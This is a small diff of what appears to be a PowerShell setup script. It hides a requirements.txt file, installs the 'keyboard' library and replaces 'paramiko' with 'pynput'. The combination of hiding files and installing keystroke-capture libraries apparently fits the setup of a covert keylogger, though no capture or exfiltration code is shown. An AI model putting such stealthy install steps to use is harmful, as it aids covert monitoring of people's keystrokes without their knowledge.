@@ -13,5 +13,5 @@ $HIDE1=Get-Item requirements.txt -Force
 $HIDE1.Attributes="Hidden"
 
 pip3 install keyboard
-pip3 install paramiko
+pip3 install pynput
 
